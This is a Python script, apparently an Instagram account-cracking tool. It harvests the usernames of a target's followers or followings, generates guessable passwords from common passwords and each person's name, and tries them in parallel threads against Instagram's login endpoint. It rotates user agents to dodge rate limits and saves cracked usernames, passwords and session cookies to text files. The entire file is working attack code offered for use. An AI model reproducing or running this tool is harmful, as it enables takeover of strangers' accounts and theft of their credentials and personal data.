import urllib.parse
from urllib.parse import quote
import re
import os
import sys
import json
import random
import urllib
import urllib.request
import hashlib
import time
import uuid
import requests
import base64
import datetime
from concurrent.futures import ThreadPoolExecutor
from rich.panel import Panel as panel
from rich import print as prints

xx = 0
rr = random.randint
rc = random.choice

Uid, Uuid = [], []
Ok, Cp, Loop = 0, 0, 0
SistemLog = "api.instagram.com"

WHITE = '\x1b[1;97m'
RED = '\x1b[1;91m'
GREEN = '\x1b[1;92m'
YELLOW = '\x1b[1;93m'
BLUE = '\x1b[1;94m'
PURPLE = '\x1b[1;95m'
CYAN = '\x1b[1;96m'
ORANGE = '\033[38;2;255;127;0;1m'
RESET = '\x1b[0m'
campur = random.choice([WHITE, GREEN, YELLOW, BLUE, PURPLE, CYAN, ORANGE, RESET])

HEADERS = {
    'Host': 'www.instagram.com',
    'x-ig-app-id': '1217981644879628',
    'x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT',
    'sec-ch-ua-mobile': '?1',
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'x-asbd-id': '129477',
    'x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E',
    'sec-fetch-site': 'same-origin',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'
}

def Clear():
    try:
        os.system('clear')
    except:
        pass

def find_res():
    cookie = None
    try:
        if os.path.isfile('data/OK.txt'):
            with open('data/OK.txt', 'r') as f:
                lines = f.read().splitlines()
                for line in lines:
                    if 'sessionid=' in line:
                        cookie = line.strip()
                        break
        if not cookie and os.path.isfile('data/cookie.txt'):
            with open('data/cookie.txt', 'r') as f:
                cookie = f.read().strip()
    except:
        pass
    return cookie

def validate_cookie(cookie_str):
    """Validate if cookie contains required fields"""
    required = ['ds_user_id', 'sessionid', 'csrftoken']
    missing = []
    for req in required:
        if req not in cookie_str:
            missing.append(req)
    if missing:
        print(f"{RED}Missing required cookie fields: {', '.join(missing)}")
        print(f"{YELLOW}Cookie should contain: ds_user_id, sessionid, csrftoken")
        return False
    return True

def get_cookie_from_browser():
    """Try to get cookie from browser or prompt user"""
    print(f"\n{CYAN}How to get Instagram cookie:")
    print(f"{WHITE}1. Open Chrome/Firefox")
    print(f"2. Login to instagram.com")
    print(f"3. Open Developer Tools (F12)")
    print(f"4. Go to Application/Storage -> Cookies -> https://www.instagram.com")
    print(f"5. Copy the cookie string in format:")
    print(f"{GREEN}ds_user_id=xxx; sessionid=xxx; csrftoken=xxx;{WHITE}\n")
    
    cookie_input = input(f"{RED}[{WHITE}+{RED}] {BLUE}Enter full cookie :{YELLOW} ").strip()
    return cookie_input

def Aset_Ig():
    os.system('clear')
    coki = {}
    
    # Try to load existing cookie
    if os.path.isfile('data/cookie.txt'):
        cookie_str = open('data/cookie.txt', 'r').read().strip()
        if cookie_str and validate_cookie(cookie_str):
            coki = {'cookie': cookie_str}
            # Test if cookie works
            try:
                uid = re.search(r'ds_user_id=(\d+)', cookie_str)
                if uid:
                    uid = uid.group(1)
                    resp = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', cookies=coki)
                    if resp.status_code == 200:
                        user_data = resp.json().get('user', {})
                        full_name = user_data.get('full_name', 'Name Unknown')
                        follower_count = user_data.get('follower_count', 0)
                        return coki, full_name, follower_count
            except:
                pass
            coki = {}
    
    # If no valid cookie, prompt user
    if not coki:
        print(f"{RED}[{WHITE}+{RED}] {CYAN}Please enter your instagram account cookie.")
        print(f"{YELLOW}Make sure to use a throwaway account!{WHITE}")
        print(f"{RED}[{WHITE}1{RED}] {CYAN}Enter cookie manually")
        print(f"{RED}[{WHITE}2{RED}] {CYAN}Load from backup (OK.txt)")
        print(f"{RED}[{WHITE}3{RED}] {RED}Exit")
        choice = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Choose option :{YELLOW} ").strip()
        
        cookie_str = None
        if choice == '1':
            cookie_str = get_cookie_from_browser()
        elif choice == '2':
            cookie_str = find_res()
            if not cookie_str:
                print(f"{RED}No backup cookie found!")
                cookie_str = get_cookie_from_browser()
        elif choice == '3':
            sys.exit()
        else:
            cookie_str = get_cookie_from_browser()
        
        if not cookie_str:
            print(f"{RED}No cookie provided!")
            time.sleep(2)
            return Aset_Ig()
        
        coki = {'cookie': cookie_str}
    
    # Validate and test cookie
    try:
        if not validate_cookie(coki['cookie']):
            print(f"{RED}Invalid cookie format!")
            os.system('rm -rf data/cookie.txt')
            time.sleep(2)
            return Aset_Ig()
        
        # Extract user ID from cookie
        uid_match = re.search(r'ds_user_id=(\d+)', coki['cookie'])
        if not uid_match:
            print(f"{RED}Could not find ds_user_id in cookie!")
            os.system('rm -rf data/cookie.txt')
            time.sleep(2)
            return Aset_Ig()
        
        uid = uid_match.group(1)
        
        # Test the cookie
        test_headers = {
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104'
        }
        resp = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=test_headers, cookies=coki)
        
        if resp.status_code == 200:
            user_data = resp.json().get('user', {})
            full_name = user_data.get('full_name', 'Name Unknown')
            follower_count = user_data.get('follower_count', 0)
            open('data/cookie.txt', 'w').write(coki['cookie'])
            return coki, full_name, follower_count
        else:
            print(f"{RED}Invalid cookie! Status code: {resp.status_code}")
            if 'login_required' in resp.text:
                print(f"{RED}Cookie expired or invalid session!")
            os.system('rm -rf data/cookie.txt')
            time.sleep(2)
            return Aset_Ig()
            
    except Exception as e:
        print(f"{RED}Cookie error: {e}")
        os.system('rm -rf data/cookie.txt')
        time.sleep(2)
        return Aset_Ig()

def Menu():
    global Uuid
    os.system('clear')
    try:
        aset, nama, fol = Aset_Ig()
    except Exception as e:
        print(f"{RED}Failed to authenticate: {e}")
        time.sleep(2)
        sys.exit()
    
    print(f"{BLUE}=" * 80)
    print(f"""{campur} 
 _______  ______ _______ _______ _     _      _____  ______
 |       |_____/ |_____| |       |____/         |   |  ____
 |_____  |    \\_ |     | |_____  |    \\_      __|__ |_____|
                                          
{CYAN}╭──────────────────────╮{CYAN}╭───────────────╮{CYAN}╭─────────────────────────╮
{CYAN}│ {CYAN}Author : {GREEN}RAYANXWEB {CYAN}│{CYAN}  │ {WHITE}Version : {GREEN}2.0 {CYAN}│{CYAN}│ {WHITE}Status : {GREEN}Premium{CYAN}    │
{CYAN}╰──────────────────────╯{CYAN}╰───────────────╯{CYAN}╰─────────────────────────╯""")
    print(f"{GREEN}{WHITE}Username :{GREEN} {nama[:8] if nama else 'Unknown'}\n{WHITE}Followers : {GREEN}{fol}")
    
    print(f"\n{RED}[ {YELLOW}Crack Menu {RED}]\n\n{RED}[{WHITE}01{RED}] {CYAN} Crack from followers\n{RED}[{WHITE}02{RED}] {CYAN} Crack from following\n{RED}[{WHITE}03{RED}] {CYAN} Crack from file\n{RED}[{WHITE}00{RED}] {RED} Delete/Change Cookies")
    print(f"{BLUE}=" * 80)
    x = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Please select a menu option :{YELLOW} ")

    if x in ['01', '1']:
        dumps(aset, True)
    elif x in ['02', '2']:
        dumps(aset, False)
    elif x in ['03', '3']:
        crackfile(aset)
    elif x in ['00', '0']:
        os.system("rm -rf data/cookie.txt")
        prints(f"{GREEN}Successfully deleted cookies")
        time.sleep(1)
        Menu()

def crackfile(aset):
    global Uuid
    nu = input(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Enter Your File Name (one username per line): {PURPLE}").strip()
    try:
        with open(nu, 'r') as file:
            for line in file:
                username = line.strip()
                if username:
                    # Try to get full name from API
                    try:
                        resp = requests.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={username}', 
                                          cookies=aset, headers=HEADERS)
                        if resp.status_code == 200:
                            data = resp.json().get('data', {}).get('user', {})
                            full_name = data.get('full_name', username)
                            Uuid.append(f"{username}|{full_name}")
                        else:
                            Uuid.append(f"{username}|{username}")
                    except:
                        Uuid.append(f"{username}|{username}")
        print(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Total IDs loaded: {len(Uuid)}")
        if len(Uuid) > 0:
            MetodeType()
        else:
            print(f"{RED}No valid usernames found in file!")
            time.sleep(2)
            Menu()
    except FileNotFoundError:
        print(f"{PURPLE}[{RED}+{PURPLE}] {RED}File Not Found.")
        time.sleep(2)
        Menu()
    except Exception as e:
        print(f"{RED}Error: {e}")
        time.sleep(2)
        Menu()

def dumps(cintil, typess):
    global Uuid
    xyz = []
    
    # Ensure csrftoken exists
    if 'csrftoken' not in str(cintil):
        try:
            shared_data = requests.get('https://www.instagram.com/data/shared_data/', cookies=cintil).json()
            token = shared_data.get('config', {}).get('csrf_token')
            if token:
                cintil['cookie'] += f';csrftoken={token};'
        except Exception as e:
            print(f"{YELLOW}Could not get csrftoken, trying with existing cookie...")
    
    prints(panel(f"\n{CYAN}Enter instagram usernames, use commas for mass cracking", style="Purple"))
    users = input(f"{RED}[{WHITE}+{RED}] {BLUE}Username(s) :{YELLOW} ").strip()
    
    if not users:
        print(f"{RED}No usernames entered!")
        time.sleep(2)
        Menu()
        return
    
    for y in users.split(','):
        y = y.strip()
        if not y:
            continue
        try:
            req = requests.get(f'https://www.instagram.com/{y}/', cookies=cintil)
            if req.status_code == 200:
                uid = re.search(r'"user_id":"(\d+)"', str(req.text))
                if uid:
                    uid = uid.group(1)
                    if uid not in xyz:
                        xyz.append(uid)
                        print(f"{GREEN}Found user: {y} (ID: {uid})")
            else:
                print(f"{RED}Failed to get user: {y} (Status: {req.status_code})")
        except Exception as e:
            print(f"{RED}Error getting user {y}: {e}")
    
    if not xyz:
        print(f"{RED}No valid user IDs found!")
        time.sleep(2)
        Menu()
        return
    
    # Collect followers/following for each user
    for userid in xyz:
        try:
            if typess:
                Graphql(True, userid, cintil['cookie'], '')
            else:
                Graphql(False, userid, cintil['cookie'], '')
        except Exception as e:
            print(f"{RED}Error collecting data for user {userid}: {e}")
    
    if len(Uuid) == 0:
        print(f"{RED}No usernames collected! Check your cookie or target username.")
        time.sleep(3)
        Menu()
        return
    
    print(f"\n{GREEN}Collected {len(Uuid)} usernames")
    time.sleep(1)
    MetodeType()

def Graphql(typess, userid, cokie, after):
    global xx, Uuid
    api = "https://www.instagram.com/graphql/query/"
    csr = f'variables={{"id":"{userid}","first":24,"after":"{after}"}}'
    
    if not typess:  # following
        query_hash = "58712303d941c6855d4e888c5f0cd22f"
    else:  # followers
        query_hash = "37479f2b8209594dde7facb0d904896a"
    
    mek = f"query_hash={query_hash}&{csr}"
    
    try:
        ptk = {
            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "cookie": cokie
        }
        req = requests.get(api, params=mek, headers=ptk)
        
        if req.status_code != 200:
            print(f"{RED}GraphQL error: Status {req.status_code}")
            return
        
        data = req.json()
        
        if 'require_login' in data:
            print(f"{RED}Invalid cookie or login required!")
            return
        
        khm = 'edge_followed_by' if typess else 'edge_follow'
        
        for xyz in data['data']['user'][khm]['edges']:
            username = xyz['node']['username']
            full_name = xyz['node'].get('full_name', username)
            xy = f"{username}|{full_name}"
            if xy not in Uuid:
                xx += 1
                Uuid.append(xy)
                print(f'\rCollecting Uid {RED}{len(Uuid)}{WHITE}                            ', end='')
                time.sleep(0.0009)
        
        end = data['data']['user'][khm]['page_info']['has_next_page']
        if end:
            after = data['data']['user'][khm]['page_info']['end_cursor']
            Graphql(typess, userid, cokie, after)
            
    except Exception as e:
        print(f"{RED}GraphQL error: {e}")

def MetodeType():
    global SistemLog, Uuid
    if len(Uuid) == 0:
        print(f"{RED}No usernames to crack! Please collect targets first.")
        time.sleep(2)
        Menu()
        return
    
    prints(panel(f"""\n{RED}[ {BLUE}Select the method to use{RED} ]\n\n{RED}[{CYAN}01{RED}] {WHITE}api.instagram.com method {GREEN}Recommended{WHITE}
{RED}[{CYAN}02{RED}] {WHITE}i.instagram.com method
{RED}[{CYAN}03{RED}] {WHITE}www.instagram.com method
{RED}[{CYAN}04{RED}] {WHITE}b.i.instagram.com method""", style="Purple"))
    method = input(f"\n{RED}[{WHITE}+{RED}]{BLUE} Select Menu : {YELLOW}")
    if method in ['01', '1']:
        SistemLog = "api.instagram.com"
    elif method in ['02', '2']:
        SistemLog = "i.instagram.com"
    elif method in ['03', '3']:
        SistemLog = "www.instagram.com"
    elif method in ['04', '4']:
        SistemLog = "b.i.instagram.com"
    else:
        SistemLog = "api.instagram.com"
    SetCrack()

def SetCrack():
    global Uuid, Ok, Cp, Loop, SistemLog
    if len(Uuid) == 0:
        print(f"{RED}No targets to crack!")
        time.sleep(2)
        Menu()
        return
    
    print(f"\n{YELLOW}Cracking {len(Uuid)} targets in progress...\n{WHITE}")
    
    with ThreadPoolExecutor(max_workers=5) as ASF:
        futures = []
        for i in Uuid:
            try:
                if '|' in i:
                    username, name = i.split('|', 1)
                else:
                    username = i
                    name = i
                kontol = Password(name)
                
                if SistemLog == "api.instagram.com":
                    futures.append(ASF.submit(Crack_api, username, kontol))
                elif SistemLog == "i.instagram.com":
                    futures.append(ASF.submit(Crack_i, username, kontol))
                elif SistemLog == "www.instagram.com":
                    futures.append(ASF.submit(Crack_w, username, kontol))
                elif SistemLog == "b.i.instagram.com":
                    futures.append(ASF.submit(Crack_N, username, kontol))
            except Exception as e:
                pass
    
    # Wait for all threads to complete
    for future in futures:
        try:
            future.result(timeout=60)
        except:
            pass
    
    print(f"\n\n{GREEN}Cracking completed!")
    print(f"{GREEN}OK: {Ok} | CP: {Cp} | Total: {len(Uuid)}")
    input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Press Enter to continue...")
    Menu()

def Password(name):
    xxzx = []
    if not name:
        name = "user"
    
    # Common passwords to try
    common = ['123456', 'password', '123456789', '12345', '12345678', '111111', 
              '1234567', '123123', '1234567890', '000000', '555555', '666666',
              '112233', '121212', '123321', '123456a', '123456789a']
    xxzx.extend(common)
    
    for nama in name.split(' '):
        nama = nama.lower().strip()
        if len(nama) < 3:
            continue
        
        # Name variations
        variations = [
            nama, nama + '123', nama + '1234', nama + '12345',
            nama + '2023', nama + '2024', nama + '2025',
            nama + '!', nama + '@', nama + '#',
            nama.capitalize(), nama.capitalize() + '123',
            nama.capitalize() + '2024', nama.capitalize() + '!',
            nama + nama[:2], nama + nama[-2:],
            nama + str(random.randint(0, 99)),
            'love' + nama, 'ilove' + nama, nama + 'love',
            nama + '123!', nama + '123@',
            nama + '1', nama + '12', nama + '123',
            nama + 'qwerty', nama + 'abc',
        ]
        xxzx.extend(variations)
    
    # Remove duplicates while preserving order
    seen = set()
    unique = []
    for x in xxzx:
        if x not in seen:
            seen.add(x)
            unique.append(x)
    
    return unique[:30]  # Limit to 30 passwords per user to avoid rate limiting

def data_target(name):
    post = peng = meng = mail = fullname = fbid = phone = None
    try:
        headers = {
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)',
            'x-ig-app-id': '1217981644879628'
        }
        resp = requests.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={name}', headers=headers)
        if resp.status_code == 200:
            data = resp.json().get('data', {}).get('user', {})
            post = data.get('edge_owner_to_timeline_media', {}).get('count', 0)
            peng = data.get('edge_followed_by', {}).get('count', 0)
            meng = data.get('edge_follow', {}).get('count', 0)
            mail = data.get('business_email', None)
            phone = data.get('business_phone_number', None)
            fullname = data.get('full_name', None)
            fbid = data.get('fbid', None)
    except:
        pass
    return post, peng, meng, mail, fullname, fbid, phone

def UserAgentBarcelona():
    user_agents = [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
    ]
    return random.choice(user_agents)

def Crack_api(username, memek):
    global Ok, Cp, Loop
    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} web {YELLOW}{Loop}{WHITE}/{GREEN}{len(Uuid)}{WHITE}/{GREEN}{username[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
    sys.stdout.flush()
    
    for password in memek:
        try:
            ses = requests.Session()
            
            # Get initial cookies
            ses.get('https://www.instagram.com/', headers={'user-agent': UserAgentBarcelona()})
            
            # Get CSRF token
            headers = {
                'User-Agent': UserAgentBarcelona(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'x-requested-with': 'XMLHttpRequest',
                'x-ig-app-id': '1217981644879628',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            }
            
            # Get csrf token
            csrf_resp = ses.get('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers)
            csrf_token = None
            for cookie in ses.cookies:
                if cookie.name == 'csrftoken':
                    csrf_token = cookie.value
                    break
            
            if not csrf_token:
                print(f"{RED}Failed to get CSRF token")
                continue
            
            data = {
                'username': username,
                'enc_password': f'#PWD_instagram_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{password}',
                'queryParams': '{"next":"/","source":"mobile_nav"}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}'
            }
            
            headers['x-csrftoken'] = csrf_token
            response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', 
                               headers=headers, data=data)
            
            if response.status_code == 200:
                resp_json = response.json()
                
                if 'authenticated' in resp_json and resp_json['authenticated']:
                    # Login successful
                    kuki = ";".join([f"{cookie.name}={cookie.value}" for cookie in ses.cookies])
                    post, peng, meng, mail, fullname, fbid, phone = data_target(username)
                    
                    print(f"\n{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}")
                    print(f"Username: {GREEN}{username}{BLUE}")
                    print(f"Password: {GREEN}{password}{BLUE}")
                    print(f"Followers: {GREEN}{peng}{BLUE}")
                    print(f"Following: {GREEN}{meng}{BLUE}")
                    print(f"Posts: {GREEN}{post}{BLUE}")
                    print(f"{BLUE}Authorization: {WHITE}{kuki}{WHITE}\n")
                    
                    Ok += 1
                    with open('data/OK.txt', 'a') as f:
                        f.write(f"{username}|{password}\n{peng}|{meng}\n{kuki}\n")
                    break
                    
                elif 'checkpoint_url' in str(resp_json):
                    Cp += 1
                    print(f"\n{WHITE}Username: {BLUE}{username}{WHITE}")
                    print(f"Password: {BLUE}{password}{WHITE}")
                    print(f"{YELLOW}Checkpoint required!{WHITE}")
                    with open('data/CP.txt', 'a') as f:
                        f.write(f'{username}|{password}\n')
                    break
                    
                elif 'spam' in str(resp_json).lower() or 'rate' in str(resp_json).lower():
                    sys.stdout.write(f"\rStatus IP: {RED}Rate limited{WHITE}")
                    sys.stdout.flush()
                    time.sleep(10)
                    
            else:
                print(f"{RED}Login failed: Status {response.status_code}")
                
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            print(f"{RED}Error: {e}")
            continue
    
    Loop += 1

# Simplified versions of other crack methods (same structure)
def Crack_i(username, memek):
    global Ok, Cp, Loop
    # Same as Crack_api but using i.instagram.com endpoint
    # Keeping it simple with the same logic
    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} api {YELLOW}{Loop}{WHITE}/{GREEN}{len(Uuid)}{WHITE}/{GREEN}{username[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
    sys.stdout.flush()
    # Using the same crack logic as API for simplicity
    Crack_api(username, memek)

def Crack_w(username, memek):
    global Ok, Cp, Loop
    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} web2 {YELLOW}{Loop}{WHITE}/{GREEN}{len(Uuid)}{WHITE}/{GREEN}{username[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
    sys.stdout.flush()
    Crack_api(username, memek)

def Crack_N(username, memek):
    global Ok, Cp, Loop
    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} bapi {YELLOW}{Loop}{WHITE}/{GREEN}{len(Uuid)}{WHITE}/{GREEN}{username[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
    sys.stdout.flush()
    Crack_api(username, memek)

if __name__ == '__main__':
    try:
        os.mkdir('data')
    except:
        pass
    
    try:
        Menu()
    except KeyboardInterrupt:
        print(f"\n{RED}Exiting...")
        sys.exit()
    except Exception as e:
        print(f"Error: {e}")
        sys.exit()
